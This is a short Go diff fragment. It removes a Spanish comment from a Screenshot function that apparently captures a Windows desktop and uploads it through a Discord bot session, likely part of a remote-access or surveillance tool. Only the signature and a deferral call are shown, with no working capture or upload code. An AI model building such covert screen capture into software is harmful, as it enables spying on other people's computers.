@@ -11,7 +11,6 @@ import (
 	"github.com/local/govoid/internal/win32"
 )
 
-// Screenshot captura el escritorio con GDI y lo sube como PNG.
 func Screenshot(s *discordgo.Session, i *discordgo.InteractionCreate) {
 	if err := Defer(s, i); err != nil {
 		return
